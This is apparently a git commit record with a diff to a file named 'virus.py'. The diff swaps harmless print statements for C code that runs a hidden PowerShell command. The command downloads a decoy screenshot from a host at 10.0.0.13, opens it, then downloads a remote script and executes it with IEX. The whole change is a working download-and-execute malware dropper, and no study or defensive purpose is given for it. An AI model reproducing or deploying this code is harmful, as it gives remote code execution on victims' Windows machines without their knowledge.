bfe37b608e6a46fb4cae0790788c5f57e28612cc
dreysimp <92762249+dreysimp@users.noreply.github.com>
2022-11-10 13:21:10 -0800

    Update virus.py

--- virus.py
+++ virus.py
@@ -1,3 +1,6 @@
-print("Hello world")
-print("whats new")
-print("hello")
+#include<stdio.h>
+main()
+{
+    system("powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://10.0.0.13/screenshot.jpg', 'C:\\Users\\Public\\screenshot.jpg') & start C:\\Users\\Public\\screenshot.jpg & powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt'))\"");
+    return 0;
+}
